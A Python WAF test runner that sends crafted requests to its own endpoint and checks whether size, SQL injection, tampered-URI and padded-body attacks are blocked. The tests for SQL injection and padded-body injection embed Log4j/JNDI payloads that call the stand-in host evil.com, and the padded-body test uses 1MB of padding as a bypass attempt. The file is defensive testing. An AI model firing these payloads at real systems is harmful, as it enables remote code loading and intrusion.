"""
WAF Test Runner - Executes test cases and generates coverage reports.

Test Cases:
1. POSITIVE: Valid request allowed, FP label detected
2. SIZE BLOCK (User-Agent): User-Agent >8KB returns 403
3. GAMIFICATION: SQLi blocked even with FP conditions met
4. NEGATIVE URI: /mytest{uri} pattern blocked (no FP label match)
5. SIZE BLOCK (Cookie): Cookie >8KB returns 403

Note on CloudFront bug:
- For GET requests with large query strings, CloudFront blocks BEFORE WAF evaluates
- Workaround: Lower WAF query_string size rule from 1024 to 10 for testing
- This ensures WAF blocks (not CloudFront) so we can verify labels
"""
from __future__ import annotations

import os
import time
import yaml
from datetime import datetime
from pathlib import Path
from typing import Optional
from urllib.parse import quote, urlparse

from .models import (
    WAFTestConfig,
    WAFRequirement,
    TestResult,
    TestStatus,
    CoverageReport,
    CheckType,
)
from .http_client import WAFHttpClient, WAFRequest
from .cloudwatch_client import CloudWatchWAFClient


class WAFTestRunner:
    """
    Test runner for WAF policy verification.

    Key behaviors:
    - Host header derived from WAF_ENDPOINT (not from yaml)
    - Negative URI test uses /mytest{uri} pattern
    - User-Agent >8KB test for size blocking
    - Gamification test for SQLi with FP conditions
    """

    MAX_HEADER_SIZE_BYTES = 8 * 1024  # 8KB
    NEGATIVE_URI_BODY_SIZE = 68000 # more than 64KB for negative uri body size
    NEGATIVE_URI_PREFIX = "/mytest"   # Configurable prefix for negative tests

    def __init__(
        self,
        waf_endpoint: str,
        cloudwatch_log_group: str,
        aws_region: str = "eu-west-1",
        account_id: str = "",
        owasp_namespace: str = "owasp",
        modules_root: Optional[Path] = None,
        negative_uri_prefix: str = "/mytest",
    ):
        self.waf_endpoint = waf_endpoint
        self.cloudwatch_log_group = cloudwatch_log_group
        self.account_id = account_id
        self.owasp_namespace = owasp_namespace
        self.negative_uri_prefix = negative_uri_prefix

        # Extract host from WAF_ENDPOINT for all requests
        parsed = urlparse(waf_endpoint)
        self.waf_host = parsed.netloc or parsed.path.split('/')[0]

        # Default modules root
        self.modules_root = modules_root or Path(__file__).parent.parent.parent / "modules" / "custom"

        # Initialize clients
        self.http = WAFHttpClient(base_url=waf_endpoint)
        self.cw = CloudWatchWAFClient(
            log_group=cloudwatch_log_group,
            region=aws_region,
        )

        self.results: list[TestResult] = []
        self.configs: dict[str, WAFTestConfig] = {}

    def discover_configs(self) -> dict[str, WAFTestConfig]:
        """Discover waf_requirements.yaml files from modules directory."""
        configs = {}

        if not self.modules_root.exists():
            print(f"Warning: Modules root not found: {self.modules_root}")
            return configs

        for yaml_file in self.modules_root.rglob("waf_requirements.yaml"):
            policy_name = yaml_file.parent.name

            try:
                with open(yaml_file) as f:
                    raw = yaml.safe_load(f)

                raw = self._interpolate_config(raw)
                config = WAFTestConfig(**raw)

                for req in config.requirements:
                    req.policy_name = policy_name
                    req.source_file = str(yaml_file)

                configs[policy_name] = config
                print(f"  Loaded: {policy_name} ({len(config.requirements)} requirements)")

            except Exception as e:
                print(f"  Warning: Failed to load {yaml_file}: {e}")

        self.configs = configs
        return configs

    def _interpolate_config(self, data: dict) -> dict:
        """Replace ${VAR} placeholders."""
        def replace_vars(obj):
            if isinstance(obj, str):
                result = obj
                result = result.replace("${WAF_ENDPOINT}", self.waf_endpoint)
                result = result.replace("${AWS_ACCOUNT_ID}", self.account_id)
                result = result.replace("${OWASP_NAMESPACE}", self.owasp_namespace)
                return result
            elif isinstance(obj, dict):
                return {k: replace_vars(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [replace_vars(item) for item in obj]
            return obj
        return replace_vars(data)

    def run_all_tests(self, policy_filter: Optional[str] = None) -> CoverageReport:
        """Run all test cases for specified policy."""
        print("\n" + "=" * 70)
        print("WAF POLICY TEST RUNNER")
        print("=" * 70)
        print(f"Endpoint: {self.waf_endpoint}")
        print(f"Host:     {self.waf_host}")
        print(f"Log Group: {self.cloudwatch_log_group}")
        print("=" * 70)

        if not self.configs:
            self.discover_configs()

        all_results = []
        total_requirements = 0

        for policy_name, config in self.configs.items():
            if policy_filter and policy_name != policy_filter:
                continue

            print(f"\n--- Testing Policy: {policy_name} ---")
            results = self._run_policy_tests(config)
            all_results.extend(results)
            total_requirements += len(config.requirements)

        report = self._generate_coverage_report("all", all_results, total_requirements)
        self._print_coverage_report(report)

        return report

    def _run_policy_tests(self, config: WAFTestConfig) -> list[TestResult]:
        """
        Run test cases for each requirement based on tuning_type.

        Test selection by tuning_type:
        - size_body: TEST 1 (with large body), TEST 2, TEST 4, TEST 5, TEST 6
        - size_querystring: TEST 1 (with query string), TEST 2, TEST 4, TEST 5
        - xss: TEST 1 (with XSS-like content), TEST 2, TEST 4, TEST 5
        - sqli: TEST 1, TEST 2, TEST 3 (gamification), TEST 4, TEST 5
        - winshell: TEST 1, TEST 2, TEST 4, TEST 5

        TEST 3 (Gamification/SQLi) only runs if sqli is in supported_checks.

        TEST 6 (Padded body injection) only runs for size_body tuning type - verifies
               that Log4j attacks are blocked even with 1MB padded body.
        """
        results = []

        for req in config.requirements:
            tuning_type = req.tuning_type or "size_body"  # Default to size_body
            print(f"\n  Requirement: {req.id} [{tuning_type}] ({req.uri})")

            # =================================================================
            # TEST 1: POSITIVE - Valid request allowed with FP label
            # Behavior varies by tuning_type
            # =================================================================
            result = self._test_positive(config, req)
            results.append(result)
            self._print_result("TEST 1 [POSITIVE]", result)

            # =================================================================
            # TEST 2: SIZE BLOCK - User-Agent >8KB returns 403
            # Runs for all tuning types
            # =================================================================
            result = self._test_oversized_user_agent(config, req)
            results.append(result)
            self._print_result("TEST 2 [UA SIZE]", result)

            # =================================================================
            # TEST 3: GAMIFICATION - SQLi blocked with FP conditions
            # Only runs if sqli is in supported_checks
            # =================================================================
            if CheckType.SQLI.value in config.labels.supported_checks:
                result = self._test_gamification_sqli(config, req)
                results.append(result)
                self._print_result("TEST 3 [GAMIFICATION]", result)

            # =================================================================
            # TEST 4: NEGATIVE URI - /mytest{uri} pattern blocked
            # Runs for all tuning types
            # =================================================================
            result = self._test_negative_uri(config, req)
            results.append(result)
            self._print_result("TEST 4 [NEGATIVE URI]", result)

            # =================================================================
            # TEST 5: SIZE BLOCK (Cookie) - Cookie >8KB returns 403
            # Runs for all tuning types
            # =================================================================
            result = self._test_oversized_cookie(config, req)
            results.append(result)
            self._print_result("TEST 5 [COOKIE SIZE]", result)

            # =================================================================
            # TEST 6: PADDED BODY INJECTION - 1MB body + Log4j attack blocked
            # Only runs for size_body tuning type (URIs with increased size limits)
            # =================================================================
            if tuning_type == "size_body":
                result = self._test_large_body_with_injection(config, req)
                results.append(result)
                self._print_result("TEST 6 [PADDED INJECTION]", result)

        return results

    # =========================================================================
    # TEST 1: POSITIVE - Valid request allowed with FP label detected
    # =========================================================================
    def _test_positive(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify tuned rule doesn't block and FP label is detected.

        Behavior by tuning_type:
        - size_body: Send request with large body
        - size_querystring: Send request with query string (or generated one)
        - xss: Send request with XSS-like content that should be allowed
        - sqli: Send request with SQL-like content that should be allowed
        - winshell: Standard request

        Expected:
        - HTTP status: 2xx (not 403)
        - WAF action: ALLOW
        - FP label present in CloudWatch
        """
        test_id = f"{req.id}:positive"
        tuning_type = req.tuning_type or "size_body"
        expected_action = req.test_config.expected_action or "ALLOW"

        # Build base request
        uri = req.uri
        body = None

        # Helper: Load body from file if specified
        def load_data_file(file_path: str) -> str:
            """Load content from file, return None if not found."""
            from pathlib import Path
            path = Path(file_path).expanduser()
            if path.exists():
               content = path.read_text()
               print(f"   Loaded {len(content)} bytes from {path}")
               return content
            else:
               print(f"   File not found: {path}, using generated payload")
               return None

        # Customize request based on tuning_type
        if tuning_type == "size_body":
            # Priority 1: Load from data_file if specified
            if req.test_config.data_file:
               print(f"   DEUBG: Loading from data_file: {req.test_config.data_file}")
               body = load_data_file(req.test_config.data_file) 
            # Add large body if configured
            if body is None and req.test_config.test_large_body:
                print(f"   DEBUG: Using generated payload of {req.test_config.large_body_size_bytes} bytes")
                body = "X" * req.test_config.large_body_size_bytes

        elif tuning_type == "size_querystring":
            # Add query string for query string size testing
            if req.test_config.test_querystring:
                uri = f"{req.uri}?{req.test_config.test_querystring}"
            elif req.test_config.test_querystring_size > 0:
                # Generate query string of specified size
                qs = "q=" + ("X" * (req.test_config.test_querystring_size - 2))
                uri = f"{req.uri}?{qs}"

        elif tuning_type == "xss":
            # Send XSS-like content that should be allowed (in body for POST)
            if req.test_config.test_payload:
                body = f'{{"content": "{req.test_config.test_payload}"}}'
            else:
                body = '{"content": "<div class=\'user-content\'>Test</div>"}'

        elif tuning_type == "sqli":
            # Send SQL-like content that should be allowed
            if req.test_config.test_query:
                uri = f"{req.uri}?{req.test_config.test_query}"
            elif req.test_config.test_payload:
                body = f'{{"query": "{req.test_config.test_payload}"}}'

        # winshell and default: standard request with no special payload

        request = WAFRequest(
            uri=uri,
            method=req.method,
            host=self.waf_host,  # Use WAF_ENDPOINT host
            headers=dict(req.headers),
            body=body,
        )

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="positive",
                expected_action=expected_action,
                message=f"HTTP error: {response.error}",
            )

        # If expected_action is BLOCK, a 403 is a PASS
        if expected_action == "BLOCK":
            if response.status_code == 403:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.PASS,
                    test_type="positive",
                    expected_action="BLOCK",
                    actual_action="BLOCK",
                    http_status=response.status_code,
                    request_id=request.request_id,
                    message=f"Correctly blocked (403)",
                    duration_ms=response.duration_ms,
                )
            else:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.FAIL,
                    test_type="positive",
                    expected_action="BLOCK",
                    actual_action="ALLOW",
                    http_status=response.status_code,
                    request_id=request.request_id,
                    message=f"Expected BLOCK but got {response.status_code}",
                )

        # Query CloudWatch for label verification (ALLOW path)
        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)

        # Select appropriate FP label based on tuning_type
        if tuning_type in ("size_body", "size_querystring"):
            fp_label = req.fp_labels.size
        elif tuning_type == "xss":
            fp_label = req.fp_labels.xss
        elif tuning_type == "sqli":
            fp_label = req.fp_labels.sqli
        else:
            fp_label = req.fp_labels.size  # Default

        if log_entry:
            fp_present = any(fp_label in lbl for lbl in log_entry.labels) if fp_label else False

            if log_entry.action == "ALLOW" and response.status_code != 403:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.PASS,
                    test_type="positive",
                    expected_action="ALLOW",
                    actual_action=log_entry.action,
                    http_status=response.status_code,
                    request_id=request.request_id,
                    expected_labels=[fp_label] if fp_label else [],
                    actual_labels=log_entry.labels,
                    message=f"Allowed with FP label: {fp_label}" if fp_present else "Allowed (no FP label needed)",
                    duration_ms=response.duration_ms,
                )
            else:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.FAIL,
                    test_type="positive",
                    expected_action="ALLOW",
                    actual_action=log_entry.action,
                    http_status=response.status_code,
                    request_id=request.request_id,
                    actual_labels=log_entry.labels,
                    message=f"BLOCKED! Expected ALLOW. FP label present: {fp_present}",
                )

        # No log - check HTTP status
        if response.status_code != 403:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="positive",
                expected_action="ALLOW",
                http_status=response.status_code,
                request_id=request.request_id,
                message="Allowed (no WAF log found)",
            )

        return TestResult(
            test_id=test_id,
            requirement_id=req.id,
            policy_name=config.policy.name,
            status=TestStatus.FAIL,
            test_type="positive",
            expected_action="ALLOW",
            http_status=response.status_code,
            request_id=request.request_id,
            message="Got 403 - request was blocked",
        )

    # =========================================================================
    # TEST 2: SIZE BLOCK - User-Agent >8KB returns 403
    # =========================================================================
    def _test_oversized_user_agent(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify User-Agent header >8KB gets blocked with 403.

        Expected:
        - HTTP status: 403
        - WAF action: BLOCK
        - Size restriction label present
        """
        test_id = f"{req.id}:size_block:user_agent"

        # Build request with oversized User-Agent (8KB + 100 bytes)
        oversized_ua = "Mozilla/5.0 " + ("X" * (self.MAX_HEADER_SIZE_BYTES + 100))

        request = WAFRequest(
            uri=req.uri,
            method=req.method,
            host=self.waf_host,
            headers={
                **req.headers,
                "User-Agent": oversized_ua,
            },
        )

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="size_block",
                expected_action="BLOCK",
                message=f"HTTP error: {response.error}",
            )

        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)

        # Check for 403
        if response.status_code == 403:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "BLOCK",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"User-Agent >8KB correctly blocked (403)",
                duration_ms=response.duration_ms,
            )
        else:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.FAIL,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "ALLOW",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"SECURITY GAP: User-Agent >8KB NOT blocked! Got {response.status_code}",
            )

    # =========================================================================
    # TEST 3: GAMIFICATION - SQLi blocked even with FP conditions met
    # =========================================================================
    def _test_gamification_sqli(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify SQLi is blocked even when request matches FP conditions.

        This prevents attackers from "gaming" the allowlist to bypass injection detection.

        Expected:
        - HTTP status: 403
        - WAF action: BLOCK
        - SQLi detection label present
        """
        test_id = f"{req.id}:gamification:sqli"
        sqli_payload = "1+union+select+1,2,3and${jndi:ldap://evil.com/a}"

        # Build request matching FP conditions but with SQLi payload
        request = WAFRequest(
            uri=f"{req.uri}?id={sqli_payload}",
            method=req.method,
            host=self.waf_host,
            headers=dict(req.headers),
        )

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="gamification",
                expected_action="BLOCK",
                message=f"HTTP error: {response.error}",
            )

        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)

        if response.status_code == 403:
            sqli_labels = [lbl for lbl in (log_entry.labels if log_entry else []) if "SQLi" in lbl or "sqli" in lbl.lower()]
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="gamification",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "BLOCK",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"SQLi blocked despite FP conditions. Labels: {sqli_labels}",
                duration_ms=response.duration_ms,
            )
        else:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.FAIL,
                test_type="gamification",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "ALLOW",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"CRITICAL: SQLi NOT blocked! Gamification attack succeeded!",
            )

    # =========================================================================
    # TEST 4: NEGATIVE URI - /mytest{uri} pattern blocked
    # =========================================================================
    def _test_negative_uri(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify request with modified URI pattern is blocked.

        Pattern: /mytest{original_uri}
        Example: /approval -> /mytestapproval

        This ensures the allowlist matches exact URI, not just contains.

        Expected:
        - HTTP status: 403 (if size check triggered)
        - WAF action: BLOCK
        - NO FP label present (URI doesn't match allowlist)
        """
        test_id = f"{req.id}:negative_uri"

        # Build tampered URI: /mytest{original_uri}
        # /approval -> /mytestapproval
        original_uri = req.uri.lstrip('/')
        tampered_uri = f"{self.negative_uri_prefix}{original_uri}"

        request = WAFRequest(
            uri=tampered_uri,
            method=req.method,
            host=self.waf_host,
            headers=dict(req.headers),
        )

        # Add oversized body to trigger size check
        request.body = "X" * self.NEGATIVE_URI_BODY_SIZE

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="negative_uri",
                expected_action="BLOCK",
                message=f"HTTP error: {response.error}",
            )

        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)
        fp_label = req.fp_labels.size
        fp_namespace = config.labels.false_positive_namespace.size

        if log_entry:
            # Check NO FP label present
            fp_present = any(fp_namespace in lbl for lbl in log_entry.labels) if fp_namespace else False

            if response.status_code == 403 and not fp_present:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.PASS,
                    test_type="negative_uri",
                    expected_action="BLOCK",
                    actual_action=log_entry.action,
                    http_status=response.status_code,
                    request_id=request.request_id,
                    actual_labels=log_entry.labels,
                    message=f"Tampered URI '{tampered_uri}' correctly blocked (no FP label)",
                    duration_ms=response.duration_ms,
                )
            elif fp_present:
                return TestResult(
                    test_id=test_id,
                    requirement_id=req.id,
                    policy_name=config.policy.name,
                    status=TestStatus.FAIL,
                    test_type="negative_uri",
                    expected_action="BLOCK",
                    actual_action=log_entry.action,
                    http_status=response.status_code,
                    request_id=request.request_id,
                    actual_labels=log_entry.labels,
                    message=f"SECURITY GAP: FP label applied to tampered URI '{tampered_uri}'!",
                )

        # No log entry - just check HTTP status
        if response.status_code == 403:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="negative_uri",
                expected_action="BLOCK",
                http_status=response.status_code,
                request_id=request.request_id,
                message=f"Tampered URI '{tampered_uri}' blocked (403)",
            )

        return TestResult(
            test_id=test_id,
            requirement_id=req.id,
            policy_name=config.policy.name,
            status=TestStatus.FAIL,
            test_type="negative_uri",
            expected_action="BLOCK",
            http_status=response.status_code,
            request_id=request.request_id,
            message=f"Tampered URI '{tampered_uri}' NOT blocked! Got {response.status_code}",
        )

    # =========================================================================
    # TEST 5: SIZE BLOCK (Cookie) - Cookie >8KB returns 403
    # =========================================================================
    def _test_oversized_cookie(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify Cookie header >8KB gets blocked with 403.

        Expected:
        - HTTP status: 403
        - WAF action: BLOCK
        - Size restriction label present
        """
        test_id = f"{req.id}:size_block:cookie"

        # Build request with oversized Cookie (8KB + 100 bytes)
        oversized_cookie = "session=" + ("X" * (self.MAX_HEADER_SIZE_BYTES + 100))

        request = WAFRequest(
            uri=req.uri,
            method=req.method,
            host=self.waf_host,
            headers={
                **req.headers,
                "Cookie": oversized_cookie,
            },
        )

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="size_block",
                expected_action="BLOCK",
                message=f"HTTP error: {response.error}",
            )

        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)

        # Check for 403
        if response.status_code == 403:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "BLOCK",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message="Cookie >8KB correctly blocked (403)",
                duration_ms=response.duration_ms,
            )
        else:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.FAIL,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "ALLOW",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"SECURITY GAP: Cookie >8KB NOT blocked! Got {response.status_code}",
            )

    # =========================================================================
    # TEST 6: PADDED BODY INJECTION - Large body (1MB) + Log4j attack blocked
    # =========================================================================
    def _test_large_body_with_injection(self, config: WAFTestConfig, req: WAFRequirement) -> TestResult:
        """
        Verify that injection attacks are blocked even with large padded body.
        """
        test_id = f"{req.id}:padded_body:injection"

        # Log4j/JNDI injection payload
        log4j_payload = "${jndi:ldap://evil.com/exploit}"

        # Generate 1MB padding + injection payload
        padding = "X" * (1024 * 1024)  # 1MB of padding
        body_with_injection = f'{{"data": "{padding}", "exploit": "{log4j_payload}"}}'

        request = WAFRequest(
            uri=req.uri,
            method=req.method,
            host=self.waf_host,
            headers=dict(req.headers),
            body=body_with_injection,
        )

        start_time = datetime.utcnow()
        response = self.http.send(request)

        if response.error:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.ERROR,
                test_type="size_block",
                expected_action="BLOCK",
                message=f"HTTP error: {response.error}",
            )

        log_entry = self.cw.find_log_by_request_id(request.request_id, start_time)

        # Check for 403
        if response.status_code == 403:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.PASS,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "BLOCK",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message="Log4j injection blocked despite 1MB padded body (403)",
                duration_ms=response.duration_ms,
            )
        else:
            return TestResult(
                test_id=test_id,
                requirement_id=req.id,
                policy_name=config.policy.name,
                status=TestStatus.FAIL,
                test_type="size_block",
                expected_action="BLOCK",
                actual_action=log_entry.action if log_entry else "ALLOW",
                http_status=response.status_code,
                request_id=request.request_id,
                actual_labels=log_entry.labels if log_entry else [],
                message=f"SECURITY GAP: Log4j injection NOT blocked with padded body! Got {response.status_code}",
            )

    # =========================================================================
    # Reporting
    # =========================================================================
    def _print_result(self, label: str, result: TestResult):
        """Print single test result."""
        icons = {TestStatus.PASS: "✓", TestStatus.FAIL: "✗", TestStatus.ERROR: "!", TestStatus.SKIP: "○"}
        icon = icons.get(result.status, "?")
        status = "PASS" if result.status == TestStatus.PASS else "FAIL"
        print(f"    {icon} {label}: {status} - {result.message}")


        # Show label comparison
        if result.expected_labels:
           print(f"         Expected labels:    {result.expected_labels}") 
        if result.actual_labels:
           print(f"         Actual labels:    {result.actual_labels}")
        if result.actual_action:
           print(f"         WAF Action:    {result.actual_action}")
  
    def _generate_coverage_report(self, name: str, results: list[TestResult], total_reqs: int) -> CoverageReport:
        """Generate coverage report with breakdown by test type."""
        report = CoverageReport(policy_name=name, total_requirements=total_reqs, results=results)

        tested_reqs = set()

        # Track counts by test type
        test_counts = {
            "positive": {"total": 0, "passed": 0},
            "size_block": {"total": 0, "passed": 0},  # User-Agent + Cookie
            "gamification": {"total": 0, "passed": 0},
            "negative_uri": {"total": 0, "passed": 0},
        }

        for r in results:
            tested_reqs.add(r.requirement_id)

            if r.test_type == "positive":
                test_counts["positive"]["total"] += 1
                if r.status == TestStatus.PASS:
                    test_counts["positive"]["passed"] += 1
            elif r.test_type == "size_block":
                test_counts["size_block"]["total"] += 1
                if r.status == TestStatus.PASS:
                    test_counts["size_block"]["passed"] += 1
            elif r.test_type == "negative_uri":
                test_counts["negative_uri"]["total"] += 1
                if r.status == TestStatus.PASS:
                    test_counts["negative_uri"]["passed"] += 1
            elif r.test_type in ("gamification", "injection"):
                test_counts["gamification"]["total"] += 1
                if r.status == TestStatus.PASS:
                    test_counts["gamification"]["passed"] += 1

        report.tested_requirements = len(tested_reqs)
        report.passed_requirements = len([r for r in results if r.status == TestStatus.PASS])
        report.failed_requirements = len([r for r in results if r.status == TestStatus.FAIL])

        # Update legacy fields for backwards compatibility
        report.positive_tests = test_counts["positive"]["total"]
        report.positive_passed = test_counts["positive"]["passed"]
        report.negative_tests = test_counts["negative_uri"]["total"]
        report.negative_passed = test_counts["negative_uri"]["passed"]
        report.injection_tests = test_counts["gamification"]["total"]
        report.injection_passed = test_counts["gamification"]["passed"]

        # Store size_block counts in report (using a simple approach)
        report._size_block_counts = test_counts["size_block"]

        return report

    def _print_coverage_report(self, report: CoverageReport):
        """Print coverage summary."""
        total_tests = len(report.results)
        passed = len([r for r in report.results if r.status == TestStatus.PASS])
        failed = len([r for r in report.results if r.status == TestStatus.FAIL])

        # Get size_block counts (TEST 2 + TEST 5)
        size_counts = getattr(report, '_size_block_counts', {"total": 0, "passed": 0})

        print("\n" + "=" * 70)
        print(f"COVERAGE REPORT: {report.policy_name}")
        print("=" * 70)
        print(f"Total Tests:      {total_tests}")
        print(f"  Passed:         {passed}")
        print(f"  Failed:         {failed}")
        print(f"Pass Rate:        {(passed/total_tests*100) if total_tests else 0:.1f}%")
        print("-" * 70)
        print(f"TEST 1 (Positive):       {report.positive_passed}/{report.positive_tests}")
        print(f"TEST 2+5 (Size Block):   {size_counts['passed']}/{size_counts['total']}")
        print(f"TEST 3 (Gamification):   {report.injection_passed}/{report.injection_tests}")
        print(f"TEST 4 (Negative URI):   {report.negative_passed}/{report.negative_tests}")
        print("=" * 70)

        failures = [r for r in report.results if r.status == TestStatus.FAIL]
        if failures:
            print(f"\nFAILED TESTS ({len(failures)}):")
            for f in failures:
                print(f"  ✗ {f.test_id}")
                print(f"    {f.message}")

    def close(self):
        """Clean up."""
        self.http.close()
